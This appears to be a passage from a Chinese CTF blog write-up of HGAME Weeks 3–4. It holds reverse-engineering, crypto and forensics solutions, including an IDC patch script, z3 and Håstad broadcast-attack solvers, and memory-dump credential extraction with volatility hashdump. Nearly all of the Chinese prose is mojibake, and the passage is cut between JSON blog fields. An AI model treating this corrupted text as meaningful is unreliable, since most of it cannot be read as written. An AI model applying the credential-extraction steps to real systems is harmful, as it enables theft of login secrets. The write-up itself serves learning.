ï¼Œä½†å‘ç°å¤„ç†åå¾—åˆ°çš„ä¸å…¨ï¼Œä¹‹åé—®äº†ä¸€ä¸‹å°åœ†å­¦é•¿å‘ç°æºç å·²ç»ç»™äº†ã€‚ â€‹ æ‰“å¼€ AFiveSecondChallenge.cpp ï¼Œæºç é‡Œæœ‰ getUnixtime è¿™ç±»è·å–æ—¶é—´çš„å‡½æ•°ï¼Œæ¸¸æˆæ—¶é—´è¶…è¿‡ 5s å°±ä¼šæ˜¾ç¤ºè¶…æ—¶ï¼Œç”¨é”ä½ç³»ç»Ÿæ—¶é—´çš„è½¯ä»¶å¯ä»¥é¿å¼€è¿™ä¸€æ£€æµ‹ã€‚é”å®šæ—¶é—´åå°±å¯ä»¥å¼€å§‹ç©æ‰«é›·ï¼Œå‡ å±€ä¸‹æ¥åä¼šå‘ç°é›·çš„ä½ç½®èƒ½æ„æˆäºŒç»´ç  â€‹ æ ¹æ®é¢˜ç›®æç¤ºï¼ŒæŠŠ managed æ–‡ä»¶å¤¹ä¸‹çš„ dll æ‹–åˆ° ida é‡Œï¼Œä¼šå‘ç°æœ‰ä¸€ä¸ªå‡½æ•°è¢«nopæ‰äº†ï¼Œå®šä½åˆ°æºç é‡ŒæŸ¥çœ‹ï¼ˆil2cppçš„ä¸­é—´æ–‡ä»¶æœ‰äº›æ··ä¹±ï¼Œåˆ é™¤äº†å½±å“åˆ¤æ–­çš„éƒ¨åˆ†ï¼‰ â€‹ è¿™é‡Œçš„ return åˆ¤æ–­æ˜¯å¦æ˜¯é›·çš„ä½ç½®ï¼Œæœ¬æ¥åˆ†æåˆ°è¿™é‡Œå·²ç»å¾ˆæ¸…æ¥šäº†ä½†æ˜¯å› ä¸ºæˆ‘å®Œå…¨ä¸æ‡‚ç±»å’Œæ–¹æ³•ä»€ä¹ˆçš„çœ‹äº†æŒºä¹… â€‹ GetAtå‡½æ•°çš„è¿”å›å€¼æ²¡åœ¨æºç é‡Œçœ‹åˆ°æœ‰åˆå§‹èµ‹å€¼äºæ˜¯è¿·æƒ‘äº†å¥½ä¹…ï¼Œåˆå»é—®äº†ä¸€ä¸‹å°åœ†å­¦é•¿è¿™éƒ¨åˆ†æ˜¯åœ¨å“ªé‡Œåˆå§‹åŒ–è¿‡ï¼Œå¾—åˆ°å›å¤è¯´æ˜¯åœ¨é‚£ä¸ª dll é‡Œé¢ã€‚ â€‹ ä½†æ˜¯æˆ‘åœ¨æˆ‘ä¸‹è½½çš„ä¸œè¥¿é‡Œé¢æ²¡å‘ç° m_Items åˆå§‹åŒ–çš„éƒ¨åˆ†ï¼Œå»ç½‘ç«™ä¸Šé‡æ–°ä¸‹è½½å¹¶æ‹–åˆ° ilspy ï¼Œå¾—åˆ°äº†è¿™ä¸ªæ•°ç»„é‡Œçš„å€¼ â€‹ æ¥ä¸‹æ¥å°±æ˜¯å†™è„šæœ¬è§£é¢˜ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;stdio.h&gt;#include&lt;math.h&gt;double matrix[45][15][3] = ;double GetAt(i, j, k){ int iBound = 45; //45 int jBound = 15; //15 int kBound = 3; //3 return matrix[i][j][k];}int main(){ int y,x; FILE* fp; fp = fopen(&quot;************&quot; , &quot;w&quot;); int a[45][45]; int i, j; for (y = 0; y &lt; 45; y++) { for (x = 0; x &lt; 45; x++) { double L_8 = GetAt(y, x / 3, 0); double L_14 = GetAt(y, x / 3, 1); double V_0 = L_14; double L_20 = GetAt(y, x / 3, 2); double V_1 = L_20; double V_2 = fmod(x, 3.0f) - 1.0f; a[x][y] = L_8* V_2* V_2 + V_0 * V_2 + V_1 &gt; 0.0 ? 1 : 0; //1æ˜¯é›· } } for (i = 0; i &lt; 45; i++) { for (j = 0; j &lt; 45; j++) { printf(&quot;%d&quot;, a[j][i]); if (a[j][i] == 1) fprintf(fp, &quot;%d,%d\\n&quot;, j, i); } printf(&quot;\\n&quot;); } fclose(fp); return 0;} 123456import matplotlib.pyplot as pltimport numpy as npx,y = np.loadtxt('./xy.txt',delimiter=',',unpack=True)plt.plot(x,y,'.')plt.show() 3.nllvm â€‹ æ‹–åˆ° ida é‡Œå‘ç°æŒºä¹±çš„ï¼Œä¹Ÿæ²¡çœ‹åˆ°æ§åˆ¶å°è¾“å‡ºçš„é‚£äº›æ–‡å­—ï¼Œé‚£å°±å…ˆè°ƒè¯•çœ‹çœ‹ â€‹ è°ƒè¯•åå‘ç°è¿™äº›å¼‚æˆ–æ“ä½œå¾—åˆ°çš„å°±æ˜¯æ§åˆ¶å°è¾“å‡ºçš„å­—ç¬¦ï¼Œåœ¨è¾“å‡ºååˆæ¥äº†ä¸€éå¼‚æˆ–è¿˜åŸã€‚ â€‹ æ¥ç€è°ƒè¯•å‘ç°åˆ¤æ–­è¾“å…¥å­—ç¬¦ä¸²çš„åœ°æ–¹ â€‹ è¿™ä¸€éƒ¨åˆ†å¼‚æˆ–å¾—åˆ° â€œCryptoFAILUREforRSA2048Key!!!â€ è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæ¥ç€æ¥åˆ°åŠ å¯†çš„å‡½æ•° â€‹ ä¼ å…¥çš„å°±æ˜¯è¿™éƒ¨åˆ†å¼‚æˆ–å¾—åˆ°å­—ç¬¦ä¸²å’Œè¾“å…¥çš„ flagï¼Œä¹‹åçœ‹äº†ä¸€ä¸‹è¿™ä¸ªå‡½æ•°é‡Œé¢æ˜¯ä¸€äº›æ¯”è¾ƒå¤æ‚çš„è¿ç®—çŒœæµ‹æ˜¯æŸç§ç®—æ³•ï¼Œæˆ‘å¯¹å„ç§ç®—æ³•ä¸æ˜¯å¾ˆç†Ÿæ‰€ä»¥ç”¨äº† ida æ’ä»¶ findcrypt ï¼Œä½†æ˜¯è¿™ä¸ªæ’ä»¶å¹¶æ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆç®—æ³•äºæ˜¯æˆ‘å°±å»æ‰¾å­¦é•¿ç¡®è®¤äº†ä¸€ä¸‹ â€‹ æŸ¥äº†å„ç§ç®—æ³•ï¼Œæœ€åå‘ç°åŠ å¯†å‡½æ•°é‡Œé¢çš„ä¸€ä¸ªå‡½æ•°åƒæ˜¯sç›’ï¼Œæ ¹æ®sç›’æ•°å­—åˆ¤æ–­åˆæ˜¯ AES åŠ å¯† ( sç›’ä¹Ÿæ˜¯å¼‚æˆ–å¾—åˆ°çš„ï¼Œè¿™å¤§æ¦‚æ˜¯æ’ä»¶æ£€æµ‹ä¸å‡ºç®—æ³•çš„åŸå›  ) â€‹ åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å¯ä»¥çŸ¥é“ ivå€¼æ˜¯ 123456789abcdef ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæ­£ç¡® flag çš„éƒ¨åˆ†ä¸å¯†æ–‡è¿›è¡Œæ¯”è¾ƒï¼Œæ”¹å˜äº†è¾“å‡ºå­—ç¬¦çš„å¤–è§‚ï¼ˆè¡¨ç¤ºæ˜¯å¦å›åˆ°ç°å®ï¼‰ â€‹ ä¹‹åç”¨æˆ‘åœ¨week2å†™çš„è„šæœ¬è§£å°±è¡Œ â€‹ æŸ¥äº†ä¸€ä¸‹é¢˜ç›®é‡Œçš„ llvm ï¼Œæ˜¯ä¸€æ¬¾ä»£ç æ··æ·†å™¨ï¼Œå…·ä½“çš„æ˜¯çœ‹äº†è¿™ç¯‡æ–‡ç« https://bbs.pediy.com/thread-224484.htm Misc 1.Akiraä¹‹ç³-1 â€‹ æŸ¥èµ„æ–™çŸ¥é“è¿™ç§ dump å‡ºæ¥çš„RAW æ–‡ä»¶è¦åœ¨ linux é‡Œç”¨ volatility çœ‹ï¼Œå…ˆæŸ¥ä¸€ä¸‹ç³»ç»Ÿç‰ˆæœ¬ â€‹ æ¥ç€ç”¨ pslist æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿè¿›ç¨‹ï¼Œæ‰¾åˆ°å¯ç–‘çš„è¿›ç¨‹å dump å‡ºæ¥ â€‹ ç”¨ foremost åˆ†ç¦»å‡ºä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œæœ¬æ¥ä»¥ä¸ºå¯†ç è¿˜åœ¨ raw æ–‡ä»¶é‡Œé¢çš„æŸä¸ªæ–‡ä»¶é‡Œæ¥å›çœ‹äº†å¥½å¤šéï¼Œä¹‹åç”¨ 010editor æ‰“å¼€å‹ç¼©åŒ…åå‘ç°æç¤ºï¼Œzip å¯†ç æ˜¯ç³»ç»Ÿç™»é™†å¯†ç  â€‹ hashdump ä¸€ä¸‹å¾—åˆ°ç™»é™†å¯†ç çš„ hash å€¼ â€‹ æŒ‰æç¤ºæŠŠå¯†ç è§£å‡ºæ¥ â€‹ æ‰“å¼€å‹ç¼©åŒ…åå‘ç°ä¸¤å¼ å›¾ç‰‡ï¼Œåå­—æ˜¯src å’Œ blindï¼Œå¾ˆå®¹æ˜“å°±æƒ³åˆ°ç›²æ°´å°ï¼Œç”¨è¿™ä¸ªå·¥å…· (https://github.com/chishaxie/BlindWaterMark) æå–å‡ºæ°´å° â€‹ å›¾ç‰‡é‡Œå°å†™çš„ L æ˜¯æ•°å­—1 2.Akiraä¹‹ç³-2 â€‹ å¾—åˆ°ä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ…å’Œ RAW æ–‡ä»¶ï¼ŒåŒæ ·å…ˆæŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹ï¼Œå‘ç° notepadè¿›ç¨‹ dumpå‡ºæ¥ â€‹ åœ¨ dump å‡ºæ¥çš„è¿›ç¨‹é‡ŒæŸ¥ä¸€ä¸‹ password å­—ç¬¦ä¸²ï¼Œå¾—åˆ° zip å¯†ç  â€‹ æ‰“å¼€å‹ç¼©åŒ…å¾—åˆ° â€‹ è¿™å‡ ä¸ªæ–‡ä»¶åå¥½åƒåœ¨å“ªé‡Œè§è¿‡ï¼Œç¿»äº†ä¸€ä¸‹å¾€å¹´çš„ writeup çŸ¥é“container æ˜¯åŠ å¯†å®¹å™¨ï¼Œcookies æ˜¯chromeæµè§ˆå™¨çš„ cookie æ•°æ®åº“ã€‚ä½†æ˜¯çœ‹ cookies æ–‡ä»¶å†…å®¹å’Œæ‰“å¼€åŠ å¯†å·éƒ½éœ€è¦å¯†ç ï¼Œå›åˆ° linux é‡Œå†æŸ¥ä¸€ä¸‹æœ‰æ— å¯†ç ï¼Œå› ä¸ºæ˜¯ notepad è¿›ç¨‹é‚£å°±æŸ¥ txt æ–‡ä»¶ â€‹ è¿™ä¸ª dumpme.txt å¾ˆå¯ç–‘ï¼Œæå–å‡ºæ¥å‘ç°ä¹‹å‰ zip å¯†ç è¿˜æœ‰ååŠå¥ã€‚ç™¾åº¦ä¸€ä¸‹çŸ¥é“ lastpass æ˜¯ chrome æµè§ˆå™¨çš„æ’ä»¶ï¼Œç”¨æ¥è®°å½•å¯†ç çš„ï¼ŒæŠŠ lastpass å’Œ dump æ”¾åœ¨ä¸€èµ·æœç´¢æ‰¾åˆ° volatility é‡Œæœ‰ lastpass è¿™ä¸ªæ’ä»¶ â€‹ å¾—åˆ°ä¸€ä¸ªå¯†ç ï¼Œä¸‹è½½ ChromeCookiesView ï¼ŒåŠ è½½ cookies æ–‡ä»¶å¹¶è¾“å…¥å¯†ç ï¼Œå¾—åˆ°åŠ å¯†å®¹å™¨å¯†ç å¹¶æç¤ºç”¨ VeraCrypt æ‰“å¼€ â€‹ æ‰“å¼€è™šæ‹Ÿåˆ†åŒºå¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥ ADS å¾—çŸ¥ NTFS éšå†™ â€‹ NTFSäº¤æ¢æ•°æ®æµï¼ˆAlternate Data Streamsï¼Œç®€ç§°ADSï¼‰æ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ã€‚åœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®æµï¼Œæ„æ€æ˜¯é™¤äº†ä¸»æ–‡ä»¶æµä¹‹å¤–è¿˜å¯ä»¥æœ‰è®¸å¤šéä¸»æ–‡ä»¶æµå¯„å®¿åœ¨ä¸»æ–‡ä»¶æµä¸­ï¼Œè¿™äº›åˆ©ç”¨NTFSæ•°æ®æµå¯„å®¿å¹¶éšè—åœ¨ç³»ç»Ÿä¸­çš„éä¸»æ–‡ä»¶æµæˆ‘ä»¬ç§°ä¹‹ä¸ºADSæµæ–‡ä»¶ã€‚è™½ç„¶æˆ‘ä»¬æ— æ³•çœ‹åˆ°ADSæµæ–‡ä»¶ï¼Œä½†å®ƒä»¬å´æ˜¯çœŸå®å­˜åœ¨ã€‚ â€‹ ç„¶åç”¨ Ntfs Streams Editor è¿™ä¸ªè½¯ä»¶æŸ¥çœ‹ ADS æµæ–‡ä»¶ï¼Œå¾—åˆ° flag â€‹ é‚£ä¸ªç½‘å€é‡Œçš„å›¾æ˜¯ Akira å­¦é•¿çš„æ–°å¤´åƒ æ€»ç»“ â€‹ ä¸ºæ—¶å››å‘¨çš„ hgme è¦ç»“æŸäº†ï¼Œè¿™ä¸ªå¯’å‡å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿è¿‡å¾—å¾ˆå……å®ï¼Œå¸Œæœ›ä»¥åèƒ½ç»§ç»­å­¦ä¹ è¿™æ–¹é¢çš„çŸ¥è¯†ï¼Œä¸æ–­è¿›æ­¥","link":"/2021/03/27/HGAME-Week4-Writeup/"},{"title":"HGAME-Week3-Writeup","text":"week3 Re 1.FAKE â€‹ æ‹–åˆ°ida â€‹ å…³é”®å‡½æ•°é‡Œæœ‰36ä¸ªæ–¹ç¨‹ï¼Œ36ä¸ªå˜é‡ï¼Œé‚£å°±ä¸å¯èƒ½æ™®é€šçš„è§£å‡ºæ¥ï¼Œ â€‹ æŸ¥æ‰¾å­—ç¬¦ä¸²å¾—åˆ°æç¤º Try angr or z3ï¼Œæˆ‘ç”¨çš„æ˜¯ z3åº“ï¼Œè„šæœ¬å¤ªé•¿äº†å°±ä¸æ”¾äº†ï¼ˆç”¨z3åº“è§£çš„æ—¶å€™ä¸€ç›´è·‘ä¸å‡ºç»“æœï¼Œå°±å»é—®äº† r3n0å­¦é•¿ï¼Œå­¦é•¿è¯´å¯èƒ½éœ€è¦ç‚¹æ—¶é—´ï¼Œä½†ä¹‹åæˆ‘é‡æ–°å¼„äº†ä¸€ä¸‹addçš„éƒ¨åˆ†å¾ˆå¿«å°±è·‘å‡ºæ¥äº†ï¼Œåº”è¯¥æ˜¯æˆ‘è‡ªå·±ä¸­é—´æ“ä½œä¸Šçš„é—®é¢˜â€¦ï¼‰ â€‹ å‡flagï¼ŒæŸ¥ä¸€ä¸‹SMC 1SMC(self-Modifying Code)ï¼Œå°±æ˜¯åœ¨çœŸæ­£æ‰§è¡ŒæŸä¸€æ®µä»£ç æ—¶ï¼Œç¨‹åºä¼šå¯¹è‡ªèº«çš„è¯¥æ®µä»£ç è¿›è¡Œè‡ªä¿®æ”¹ï¼Œåªæœ‰åœ¨ä¿®æ”¹åçš„ä»£ç æ‰æ˜¯å¯æ±‡ç¼–ï¼Œå¯æ‰§è¡Œçš„ã€‚åœ¨ç¨‹åºæœªå¯¹è¯¥æ®µä»£ç è¿›è¡Œä¿®æ”¹ä¹‹å‰ï¼Œåœ¨é™æ€åˆ†æçŠ¶æ€ä¸‹ï¼Œå‡æ˜¯ä¸å¯è¯»çš„å­—èŠ‚ç ï¼ŒIDAä¹‹ç±»çš„åæ±‡ç¼–å™¨æ— æ³•è¯†åˆ«ç¨‹åºçš„æ­£å¸¸é€»è¾‘ã€‚æ˜¯ä¸€ç§åè°ƒè¯•ä»£ç æŠ€æœ¯ã€‚ â€‹ åœ¨idaé‡Œæ‰¾ä¸€ä¸‹smcè‡ªè§£å¯†çš„éƒ¨åˆ† â€‹ è¿™æ®µä»£ç æ‰§è¡Œåæ‰å¾—åˆ°çœŸæ­£çš„ä»£ç ï¼Œå†™ idc è„šæœ¬æ¥è§£å¯† ida åç¼–è¯‘åé”™è¯¯çš„ä»£ç  123456789101112#include &lt;idc.idc&gt;static main(){ auto addr = 0x00401216; //å‡½æ•°åœ°å€ auto addr2 = 0x00409080; //byteæ•°ç»„åœ°å€ auto i = 0; for(i=0;i&lt;=0x43E;i++) { PatchByte(addr+i,Byte(addr+i)^Byte(addr2+i)); }} â€‹ å¾—åˆ°è¿è¡Œè¿‡ç¨‹ä¸­çœŸæ­£çš„ä»£ç  â€‹ è¿™éƒ¨åˆ†ç»§ç»­ç”¨z3åº“å†™è„šæœ¬å»è§£ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from z3 import *s = Solver()a1 = [0] * 36for i in range(36): a1[i] = Int('a1[' + str(i) + ']')v3 = [0]*36v2 = [0]*36v4 = [0]*36v3[0] = 55030v3[1] = 61095v3[2] = 60151v3[3] = 57247v3[4] = 56780v3[5] = 55726v3[6] = 46642v3[7] = 52931v3[8] = 53580v3[9] = 50437v3[10] = 50062v3[11] = 44186v3[12] = 44909v3[13] = 46490v3[14] = 46024v3[15] = 44347v3[16] = 43850v3[17] = 44368v3[18] = 54990v3[19] = 61884v3[20] = 61202v3[21] = 58139v3[22] = 57730v3[23] = 54964v3[24] = 48849v3[25] = 51026v3[26] = 49629v3[27] = 48219v3[28] = 47904v3[29] = 50823v3[30] = 46596v3[31] = 50517v3[32] = 48421v3[33] = 46143v3[34] = 46102v3[35] = 46744v2[0] = 104v2[1] = 103v2[2] = 97v2[3] = 109v2[4] = 101v2[5] = 123v2[6] = 64v2[7] = 95v2[8] = 70v2[9] = 65v2[10] = 75v2[11] = 69v2[12] = 95v2[13] = 102v2[14] = 108v2[15] = 97v2[16] = 103v2[17] = 33v2[18] = 45v2[19] = 100v2[20] = 111v2[21] = 95v2[22] = 89v2[23] = 48v2[24] = 117v2[25] = 95v2[26] = 107v2[27] = 111v2[28] = 110v2[29] = 119v2[30] = 95v2[31] = 83v2[32] = 77v2[33] = 67v2[34] = 63v2[35] = 125for i in range(0,6): for j in range(0,6): for k in range(0,6): v4[6 * i + j] += v2[6 * k + j] * a1[6 * i + k]for i in range(0,6): for j in range(0,6): s.add(v4[6*i+j] == v3[6 * i + j])s.check()result = s.model()for i in range(0, 36): print(result[a1[i]], end=' ') Crypto 1.LikiPrime â€‹ è¿˜æ˜¯ RSAï¼Œä¸è¿‡ç´ æ•° N æ›´å¤§äº†ï¼Œä½†æ˜¯æ”¾åˆ°ç½‘ç«™é‡Œåˆ†è§£è¿˜æ˜¯èƒ½åˆ†è§£å‡º qå’Œ pï¼Œä¹‹åå°±æ˜¯ç”¨ä¸Šå‘¨çš„è„šæœ¬è·‘å‡ºflag 2.HappyNewYear!! â€‹ e = 3ï¼Œå‘é€å†…å®¹ç›¸åŒï¼Œè‡ªç„¶å°±æƒ³åˆ°ä½æŒ‡æ•°å¹¿æ’­æ”»å‡»ï¼Œä½†æ˜¯å¹¿æ’­æ”»å‡»åªéœ€è¦ eç»„æ•°æ®ï¼Œé‚£ä¹ˆçŒœæµ‹ç»™çš„æ•°æ®é‡Œè§£å‡ºæ¥çš„æ˜æ–‡ä¸æ˜¯å…¨éƒ¨ç›¸åŒã€‚ â€‹ ä½æŒ‡æ•°å¹¿æ’­æ”»å‡»éœ€è¦ç”¨åˆ°ä¸­å›½å‰©ä½™å®šç†ï¼ˆå­™å­å®šç†ï¼‰ï¼Œè„šæœ¬å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344from libnum import n2simport gmpy2from functools import reducedef modinv(a, m): return int(gmpy2.invert(gmpy2.mpz(a), gmpy2.mpz(m)))def chinese_remainder(n, a): sum = 0 prod = reduce(lambda a, b: a * b, n) for n_i, a_i in zip(n, a): p = prod // n_i sum += a_i * modinv(p, n_i) * p return int(sum % prod)n1 = c1 = n2 = c2 = n3 = c3 = n4 = c4 = n5 = c5 =n6 = c6 = n7 = c7 = nset = [n2,n4,n6]cset = [c2,c4,c6]m = chinese_remainder(nset, cset)m = gmpy2.iroot(m,3)m = int(m[0])print(n2s(m)) c1,c3,c5 è§£å¯†å¾—åˆ°ä¸€ä¸ªç‰‡æ®µï¼Œc2,c4,c6è§£å¯†å¾—åˆ°å‰©ä¸‹çš„flagç‰‡æ®µï¼ˆæœ¬æ¥å†™çš„æ˜¯éšæœºåœ¨ç»™å‡ºçš„7ç»„æ•°æ®é‡ŒæŒ‘ä¸‰ç»„è§£å¯†ï¼Œä½†æ˜¯æ²¡è·‘å‡ºç»“æœï¼Œåæ¥æ‰‹åŠ¨è¯•äº†ä¸€ä¸‹è¯•å‡ºæ¥äº†ï¼‰ Misc 1.A R K â€‹ æ‰“å¼€ä¸‹è½½çš„æµé‡åŒ…ï¼Œé¦–å…ˆçœ‹åˆ°dnsé‡Œçš„åŸŸå â€‹ åˆšå¼€å§‹ä»¥ä¸ºè·Ÿç½‘å€æœ‰å…³ï¼Œä½†åæ¥é¢˜ç›®é‡Œè¯´ â€œæœ¬é¢˜ç›®æ‰€æœ‰è§£é¢˜æ“ä½œå‡åªç”¨æµé‡ï¼Œä¸ç½‘å€æ— å…³â€ ï¼Œé‚£å°±æ¥ç€çœ‹å…¶ä»–åŒ…ï¼ŒæŸ¥èµ„æ–™çŸ¥é“ TLS åŠ å¯†å°è¯•æ‰¾åˆ°æµé‡åŒ…é‡Œçš„è¯ä¹¦ â€‹ å¯¼å‡ºåŸå§‹æ•°æ®ä¿å­˜ä¸º ssl.log ,å†é‡æ–°å¯¼å…¥è§£å¯† â€‹ æ‰¾åˆ°è§£å¯†åçš„ HTTP æµï¼Œå¯¼å‡ºåå¾—åˆ°ä¸€å †jsonæ–‡ä»¶ï¼Œå¯¼å‡ºæ¥åå¡äº†ä¸€æ®µæ—¶é—´ï¼Œä¹‹åçœ‹åˆ°é¢˜ç›®çš„è¡¥å……ä¿¡æ¯ â€‹ è¡¥å……è¯´æ˜ï¼šæ˜æ—¥æ–¹èˆŸæ˜¯ä¸€æ¬¾å¡”é˜²æ¸¸æˆï¼Œå¯ä»¥å°†å¯éƒ¨ç½²å•ä½æ”¾ç½®åœ¨åœºåœ°ä¸­ã€‚å¹¶ä¸”å…·æœ‰è‡ªå¾‹åŠŸèƒ½ï¼Œå¯ä»¥è®°å½•éƒ¨ç½²çš„æ“ä½œã€‚ ç¿»è¯‘ï¼šæ²¡ç”¨ æ²¡ç”¨ å‡ºé¢˜äººç”¨å¯éƒ¨ç½²å•ä½ç”»äº†ä¸ªä¸œè¥¿ èƒŒæ™¯æ˜¯ç™½è‰²çš„ â€‹ è®°å½•éƒ¨ç½²æ“ä½œï¼Ÿï¼é‚£å°±æ‰“å¼€ getBattleReplay æ–‡ä»¶ï¼Œçœ‹åˆ°åƒæ˜¯ base64 ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œè§£ç çœ‹åˆ° zip æ–‡ä»¶å¤´æ ‡è¯†å¦å­˜ä¸º zipï¼Œè§£å‹æ‰“å¼€å‘ç°é…å¯¹çš„ row å’Œ col ï¼Œåº”è¯¥æ˜¯éƒ¨ç½²çš„åæ ‡ï¼Œå†æ ¹æ®é¢˜ç›®é‡Œçš„ ç”»äº†ä¸ªä¸œè¥¿ çŒœæµ‹è¿™äº›åæ ‡æ˜¯äºŒç»´ç é»‘è‰²éƒ¨åˆ†ï¼Œå¤„ç†ä¸€ä¸‹å†è¿è¡Œè„šæœ¬ â€‹ æ‰«ç å¾—flag 2.A R C â€‹ å‹ç¼©åŒ…åŠ å¯†äº†ï¼Œé‚£å°±å…ˆçœ‹å›¾ç‰‡æ‰¾å¯†ç  â€‹ åˆšå¼€å§‹è¯¯ä»¥ä¸º BV æ˜¯æŸç§ CTF ä¸­çš„åŠ å¯†æ–¹å¼ï¼Œåœ¨ç½‘ä¸Šæœç´¢äº†ä¸€åœˆæ²¡æœ‰æ”¶è·ï¼Œäºæ˜¯å»é—® Akira å­¦é•¿ BV é™¤äº† bç«™BVå·è¿˜æœ‰ä»€ä¹ˆæ„æ€ï¼Œå­¦é•¿çš„ç­”å¤æ˜¯ â€‹ æ€ä¹ˆå®ç°çš„ï¼ŸæŸ¥ avå·æ€æ ·è½¬ bvå·åå‘ç° https://www.zhihu.com/question/381784377/answer/1099438784 è¿™ä¸ªå›ç­”é‡Œçš„å®ç°æ–¹æ³•ï¼Œæ ¹æ® hint1ï¼š8558 åº”è¯¥ç†è§£æˆ85å’Œ58ï¼ŒBVå·_æ˜¯æ‰€ä»¥å›¾ç‰‡é‡Œçš„æ˜¯__ å…ˆå¯¹å›¾é‡Œçš„å¯†æ–‡è¿›è¡Œ base85 è§£å¯† â€‹ æ ¹æ®é•¿åº¦åˆ¤æ–­åº”è¯¥æ˜¯ avå·è½¬ bvå·ç®—æ³•é‡Œçš„tableï¼Œé‚£å°±æ¢ä¸€ä¸‹ä¸Šé¢é“¾æ¥é‡Œä»£ç çš„tableï¼Œå¯†æ–‡æ˜¯å‹ç¼©åŒ…åé‡Œçš„æ•°å­—ï¼Œè·‘ä¸€ä¸‹å¾—åˆ°å‹ç¼©åŒ…å¯†ç  â€‹ æ‰“å¼€åå¾—åˆ°ä¸€æ®µ arc è§†é¢‘å’Œå¯†æ–‡ï¼Œç”¨é¢˜ç›®é‡Œç»™çš„è½¯ä»¶æ’­æ”¾è§†é¢‘å¾—åˆ° â€‹ å‘ç°å›¾ä¸­ç¬¬ä¸€è¡Œæ–‡å­—å’Œæ–‡æœ¬é‡Œæ–‡å­—ç›¸ä¼¼ï¼ŒçŒœæµ‹æ˜¯åŒç§åŠ å¯†æ–¹å¼ï¼Œä¹‹ååˆæ²¡æœ‰æ€è·¯äº†ï¼Œhint2é‡Œæåˆ° è¯é¢‘åˆ†ææ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œåˆ«å¿˜äº†è§†é¢‘é‡Œçš„é—®é¢˜ ï¼ŒæŸ¥äº†ä¸‹è§†é¢‘é‡Œçš„é—®é¢˜ä½†æ²¡ä»€ä¹ˆå‘ç°ã€‚åæ¥åˆæ”¾å‡ºhint ç”¨äº†æŸç§ROTçš„èŒƒå›´ï¼Œä½†æ˜¯ä½ç§»ä¸ä¸€æ · ï¼Œæ ¹æ®ä¸¤ä¸ªå­—ç¬¦çš„åº”è¯¥æ˜¯ is ä¹‹ç±»çš„å°è¯•å°†æ¯ä¸ªå­—ç¬¦åç§»10ä½ï¼Œå¾—åˆ°äº†ä¸€æ®µè‹±æ–‡ï¼Œç„¶ååˆå¡ä½äº†ã€‚äºæ˜¯åˆå»é—® Akiraå­¦é•¿ï¼Œå­¦é•¿è¯´å¹¶ä¸æ˜¯åç§»10ä½æç¤ºæˆ‘å†æƒ³æƒ³è§†é¢‘é‡Œé—®é¢˜çš„ç­”æ¡ˆï¼Œçªç„¶æƒ³èµ·ä¹‹å‰æœ‰æŸ¥åˆ° 42 è¿™ä¸ªæ•°å­—ï¼Œå°è¯•åç§»42ä½å¾—åˆ°æ­£ç¡®çš„æ–‡å­— â€‹ è§†é¢‘é‡Œæ–‡å­—ç¬¬ä¸€è¡Œä¹Ÿæ˜¯åç§» 42ä½å¾—åˆ° MSU å¯†ç ï¼Œè§£å¯†å¾—åˆ°çš„æ–‡å­—é‡Œæåˆ°è§†é¢‘é‡Œç¬¬äºŒè¡Œçš„åŠ å¯†æ–¹æ³• Likiå­¦é•¿æåˆ°è¿‡ï¼Œæ ¹æ® week1 cryptoçš„ç¬¬ä¸€é¢˜ï¼Œç¬¬äºŒè¡Œæ–‡å­—åŠ å¯†æ–¹æ³•åº”è¯¥æ˜¯ç»´å‰å°¼äºšï¼Œå¯†é’¥æ˜¯ Akira â€‹ åœ¨ virtualDub2é‡Œå®‰è£…MSUstegoæ’ä»¶ï¼Œç”¨ä¹‹å‰å¾—åˆ°çš„å¯†ç å¯¹è§†é¢‘è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°ç½‘å€ã€å…‰å’Œå¯¹ç«‹çš„åå­—ï¼Œè®¿é—®ç½‘ç«™è¾“å…¥ç”¨æˆ·åå’Œå¯†ç  â€‹ æ ¹æ®hint5: / ä¸æ˜¯å¯è¾“å…¥çš„æ„æ€ï¼Œæ˜¯ç½‘ç«™è·¯å¾„ï¼Œæƒ³èµ·ä¹‹å‰è§†é¢‘è§£å‡ºçš„ç¬¬äºŒè¡Œè¿˜æ²¡ç”¨ä¸Šï¼Œé‚£å°±åœ¨ç½‘ç«™è·¯å¾„åè¾“å…¥è§£å‡ºçš„æ˜æ–‡ï¼Œå¾—åˆ°flagï¼ˆpmï¼‰ â€‹ è¿™å‘¨miscè™½ç„¶éš¾ä½†å¾ˆæœ‰è¶£ï¼Œæ¢—æŒºå¤šçš„ æ€»ç»“ï¼š â€‹ è¿™å‘¨å› ä¸ºè·Ÿçˆ¶æ¯å›è€å®¶æ‹œå¹´å°‘äº†å¾ˆå¤šåšé¢˜çš„æ—¶é—´ï¼Œä¹‹åç”µè„‘è¿˜å‡ºäº†æ•…éšœé‡è£…äº†ç³»ç»Ÿï¼Œä¸‹å‘¨è¦ä¸“æ³¨äºreäº†ï¼Œä¸èƒ½å†é ç€ misc å’Œ crypto ä¸Šåˆ†äº† æ¥ä¸‹æ¥æ˜¯æ²¡åšå‡ºæ¥çš„éƒ¨åˆ† re â€‹ Gunè¿™é“é¢˜ç”¨æŸ¥å£³å·¥å…·æŸ¥å¾—æ˜¯æ¢†æ¢†å…è´¹ç‰ˆåŠ 